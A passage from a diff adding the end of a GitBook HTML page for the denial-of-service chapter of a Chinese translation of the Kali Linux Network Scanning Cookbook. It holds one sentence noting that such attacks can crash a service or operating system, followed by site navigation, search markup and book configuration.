&#x8FD9;&#x53EF;&#x80FD;&#x4E2D;&#x65AD;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x6216;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x3002;</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="ch5.html" class="navigation navigation-prev " aria-label="Previous page: 第五章 漏洞扫描">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="ch7.html" class="navigation navigation-next " aria-label="Next page: 第七章 Web 应用扫描">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"第六章 拒绝服务","level":"1.7","depth":1,"next":{"title":"第七章 Web 应用扫描","level":"1.8","depth":1,"path":"ch7.md","ref":"ch7.md","articles":[]},"previous":{"title":"第五章 漏洞扫描","level":"1.6","depth":1,"path":"ch5.md","ref":"ch5.md","articles":[]},"dir":"ltr"},"config":{"plugins":["comment"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"comment":{"highlightCommented":true},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"wizardforcel","pdf":{"pageNumbers":true,"fontSize":16,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Kali Linux 网络扫描秘籍","language":"zh","links":{"sidebar":{"Kali Linux 网络扫描秘籍":"https://www.gitbook.com/book/wizardforcel/kali-linux-network-scanning-cookbook"},"gitbook":true},"gitbook":"*","description":"Kali Linux Network Scanning Cookbook 中文版"},"file":{"path":"ch6.md","mtime":"2016-11-25T09:44:31.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2016-11-26T04:32:05.478Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-comment/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
